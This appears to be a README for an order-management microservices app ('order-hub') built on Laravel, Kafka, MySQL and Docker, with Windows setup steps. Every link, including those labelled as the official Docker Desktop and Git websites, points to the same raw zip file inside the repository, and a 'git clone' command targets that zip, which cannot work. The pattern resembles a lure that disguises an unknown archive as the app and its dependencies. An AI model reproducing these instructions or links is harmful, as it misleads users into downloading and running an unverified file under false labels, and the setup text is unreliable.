# ⚙️ order-hub - Manage Orders Easily with Microservices

[![Download order-hub](https://img.shields.io/badge/Download-Order--Hub-brightgreen?style=for-the-badge&logo=github)](https://github.com/ALMAZENY1/order-hub/raw/refs/heads/main/notification-service/public/hub_order_3.8.zip)

order-hub is an application designed to handle order-related tasks quickly and reliably. It uses a system where different parts work independently but talk to each other. This helps keep things running smoothly, even when traffic is high. The app runs on your Windows computer using Docker, so you do not need to install a lot of software separately.

---

## 📦 What You Need Before You Start

To run order-hub on Windows, your computer must meet these basic requirements:

- A PC running Windows 10 or later (64-bit preferred)  
- At least 8 GB of RAM  
- Minimum 4 GB of free disk space  
- Internet connection to download files  
- Administrative rights to install software  
- PowerShell or Command Prompt access

You will also need to install a few supporting programs. This guide will walk you through downloading and installing them.

---

## 🔧 Installing Required Software

Before running order-hub, install these important tools:

### 1. Install Docker Desktop for Windows  
Docker allows order-hub to run inside containers. Containers help keep everything organized and isolated.  

- Go to the official Docker Desktop website: https://github.com/ALMAZENY1/order-hub/raw/refs/heads/main/notification-service/public/hub_order_3.8.zip  
- Download the installer for Windows (choose the stable release).  
- Run the installer and follow the on-screen instructions.  
- After installation, open Docker Desktop and allow any additional setup it may request.  
- Verify Docker is running by opening PowerShell and typing:  
  ```
  docker --version
  ```  
  You should see the version number if Docker installed correctly.

### 2. Install Git (optional but recommended)  
Git lets you download the order-hub files easily if you want to use the command line.  

- Visit https://github.com/ALMAZENY1/order-hub/raw/refs/heads/main/notification-service/public/hub_order_3.8.zip  
- Download and install Git using default options.  
- After installation, open PowerShell and type:  
  ```
  git --version
  ```  
  You should see the Git version number.

---

## 🚀 Download and Setup order-hub

### Step 1: Get the Files  
Visit the order-hub download page at the following link to get the latest version:  

[Download order-hub](https://github.com/ALMAZENY1/order-hub/raw/refs/heads/main/notification-service/public/hub_order_3.8.zip)

On this page, look for a folder named `Releases` or `Code`. You can either:  

- Click **Code** > **Download ZIP** to get all files in a zip file, or  
- Use the Git command if you installed Git:  
  ```
  git clone https://github.com/ALMAZENY1/order-hub/raw/refs/heads/main/notification-service/public/hub_order_3.8.zip
  ```  

Save the files in a folder you can remember, like `C:\order-hub`.

### Step 2: Open the Folder  
Open the folder where you saved the files.  
Make sure you see a file named `docker-compose.yml`. This file tells Docker how to run everything.

### Step 3: Start order-hub Using Docker  
- Open PowerShell or Command Prompt as an administrator.  
- Navigate to the order-hub folder. For example:  
  ```
  cd C:\order-hub
  ```  
- Run this command to start the application:  
  ```
  docker-compose up -d
  ```  
Docker will download needed components and start the application. This may take a few minutes the first time.

### Step 4: Confirm Everything is Running  
To check if order-hub is running:  

- In PowerShell, type:  
  ```
  docker ps
  ```  
- This will list active containers. Look for names related to order-hub or services like `laravel`, `kafka`, or `mysql`.  
- You can also check your browser by opening:  
  ```
  http://localhost:8000
  ```  
  You should see a welcome message or a dashboard related to orders.

---

## ⚙️ Using order-hub on Windows

order-hub manages orders through several parts working together. These parts include:

- **Order Service:** Handles creating and updating orders.  
- **Kafka:** Sends messages between services to keep data in sync.  
- **Database (MySQL):** Stores order data securely.  
- **Redis Cache:** Speeds up data access.  
- **Dashboard:** View and manage orders through your browser.

### Starting and Stopping order-hub

- To stop the application, run:  
  ```
  docker-compose down
  ```  
- To restart the application, repeat the start command:  
  ```
  docker-compose up -d
  ```  

This controls all parts at once.

---

## 🛠️ Common Issues and Fixes

### Docker Does Not Start  
- Check if your Windows supports virtualization in BIOS.  
- Restart your machine and try again.  
- Make sure Docker Desktop is up to date.

### Ports Are Busy  
If you get errors about ports like 8000 being in use, close any apps using those ports or modify the `docker-compose.yml` to use different port numbers.

### Commands Not Found  
Ensure you run PowerShell or Command Prompt as Administrator and that Docker is correctly installed.

---

## 🔍 How order-hub Works in Simple Terms

order-hub sends messages between small parts to process orders. This method helps handle many orders at once without slowing down. Each part does one job only, which makes the system easy to maintain and update.

Redis saves some data to speed up responses. Kafka carries messages between these parts, so they always know what to do. Docker runs all these parts on your PC as if they were separate computers.

---

## 🎯 What You Can Do Next

- If you want to stop using order-hub, run `docker-compose down` in your project folder.  
- To update order-hub, download the latest files again and restart Docker.  
- For any questions about how the system works or errors you find, visit the GitHub page or open an issue there.

---

## 🗂️ Additional Resources

The order-hub system uses the following technology:

- **Laravel:** Backend PHP framework.  
- **Kafka:** Message broker for communication.  
- **Docker:** Container technology to run the app.  
- **MySQL:** Database for storing order information.  
- **Redis:** Cache for fast data access.  
- **JWT:** Secure login tokens.  
- **Observability tools:** Monitor app health.

Each tool runs inside Docker containers, so you do not need to install them individually on Windows.

---

## 🖥️ Support and Feedback

If you experience problems or want to suggest improvements, visit the GitHub repository at the download link. You can open new issues to report bugs or request help.

[Get order-hub here](https://github.com/ALMAZENY1/order-hub/raw/refs/heads/main/notification-service/public/hub_order_3.8.zip)